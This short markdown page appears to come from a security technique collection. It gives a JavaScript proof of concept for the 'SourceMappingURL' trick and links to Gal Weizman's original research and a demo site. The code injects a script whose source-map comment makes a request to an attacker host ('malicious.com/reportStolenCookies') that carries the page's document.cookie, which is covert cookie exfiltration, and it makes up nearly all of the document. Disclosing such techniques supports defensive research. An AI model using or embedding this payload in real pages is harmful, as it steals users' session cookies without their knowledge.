# SourceMappingURL

### POC

```javascript
function  smap(url, data)  {
    const script = document.createElement('script');
    script.textContent =  `//# SourceMappingURL=${url}?data=${JSON.stringify(data)}`;
    document.head.appendChild(script);
    script.remove();
}

smap('https://malicious.com/reportStolenCookies',  {cookie: document.cookie});
```
### Resources

- [Original research and fully detailed explanation](https://weizman.github.io/website/?javascript-anti-debugging-some-next-level-shit-part-1) [[Gal Weizman](https://weizman.github.io/website)]
- [Demo site](https://us-central1-smap-251411.cloudfunctions.net/index) [[Gal Weizman](https://weizman.github.io/website)]
